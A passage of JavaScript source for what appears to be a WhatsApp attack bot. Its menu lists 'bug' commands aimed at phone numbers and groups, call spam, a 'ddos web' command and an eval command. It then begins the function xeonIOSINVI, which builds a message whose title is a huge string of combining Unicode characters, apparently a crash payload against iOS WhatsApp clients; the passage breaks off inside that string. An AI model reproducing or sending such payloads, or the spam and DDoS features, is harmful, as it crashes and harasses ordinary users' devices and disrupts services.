           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
  
  //menu
  async function XeonMenu(){
  	const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const xeonmenuoh = `Hello ${pushname}
╰┈➤ ${xeonytimewisher} 😄
${readmore}
╰┈➤ ʙᴜɢ ᴍᴇɴᴜ
> *_xdelaydroid number_*
> *_xiosinvi number_*
> *_xgroup groupid_*
> *_lockotp number_*
> *_xallfinityxx number_*
> *_xskew groupid_*
> *_Aviblock_*
╰┈➤ ʙᴜɢ ᴏᴛʜᴇʀ
> *_callspam number_*

╰┈➤ ᴇɴᴄ/ᴅᴇᴄ ᴍᴇɴᴜ
> *_dec doc (reply document)_*
> *_enc doc (reply document)_*

╰┈➤ ᴅᴅᴏꜱ ᴍᴇɴᴜ
> *_ddos web_*
> *_checkhost web_*

╰┈➤ ᴏᴛʜᴇʀ ᴍᴇɴᴜ
> *_debug (reply chat)_*
> *_eval (reply chat)_*
> *_listgc_*
> *_group-id linkgc_*
> *_rvo (reply chat)_*`
    
    Avishka.sendMessage(m.chat, {
                        text: xeonmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/8ynou2.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
    }
    
    //debug
    async function XeonDebug(Quoted){
    replygcxeon(`${JSON.stringify(Quoted, null, 2)}`)
    }
  
  //ios 1
  async function xeonIOSINVI(target){
var bugios2 = generateWAMessageFromContent(target, proto.Message.fromObject({
  "extendedTextMessage": {
    "text": "Https://redtube.com",
    "matchedText": "Https://redtube.com",
    "canonicalUrl": "Https://redtube.com",
    "description": "🦄 REAL-KING-AVI 🦄",
    "title": "ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙𞋬𞋬𞋬𞋬𞋬??︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡙࡙𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??︫︫࡛࡛࡛࡛𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬